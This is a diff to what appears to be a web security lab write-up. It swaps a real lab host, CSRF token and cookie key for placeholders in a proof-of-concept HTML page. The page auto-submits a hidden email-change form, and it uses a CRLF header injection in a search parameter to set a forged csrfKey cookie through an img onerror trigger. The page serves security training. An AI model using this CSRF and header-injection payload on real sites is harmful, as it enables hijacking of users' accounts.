@@ -27,12 +27,12 @@
   ```
   <html>
   	<body>
-  		<form method="POST" action="https://0ac3008a03e6bd5c80d362dc009a00ae.web-security-academy.net/my-account/change-email">
+  		<form method="POST" action="https://xxxxx.web-security-academy.net/my-account/change-email">
   			<input type="hidden" name="email" value="tester@gmail.com"/>
-  			<input type="hidden" name="csrf" value="a7sf6K93VBrBxZQZIXSeSatGxlJYmlSd"/>
+  			<input type="hidden" name="csrf" value="YOUR-TOKEN"/>
   			<input type="submit" value="Submit">
   		</form>
-  <img src="https://0ac3008a03e6bd5c80d362dc009a00ae.web-security-academy.net//?search=test%0D%0ASet-Cookie:%20csrfKey=NQvueIiryU38DfxEXOrFezmMK8s27MCH;%20SameSite=None" onerror="document.forms[0].submit()">
+  <img src="https://xxxx.web-security-academy.net//?search=test%0D%0ASet-Cookie:%20csrfKey=YOUR-KEY;%20SameSite=None" onerror="document.forms[0].submit()">
   	</body>
   <html>
   ```
